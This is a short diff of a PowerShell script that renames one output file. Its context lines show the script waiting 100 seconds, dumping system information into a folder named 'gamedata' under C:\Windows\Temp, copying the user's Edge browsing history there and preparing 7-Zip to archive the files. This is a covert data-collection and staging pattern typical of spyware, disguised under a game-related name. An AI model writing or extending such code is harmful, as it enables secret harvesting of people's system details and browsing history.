@@ -1,5 +1,5 @@
 Start-Sleep -Seconds 100
-systeminfo > C:\Windows\Temp\gamedata\systeminfo.txt
+systeminfo > C:\Windows\Temp\gamedata\systeminformation.txt
 $browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"
 cp $browsing_history_file_path C:\Windows\Temp\gamedata
 # Set the path to the 7-Zip executable (replace with your actual path)
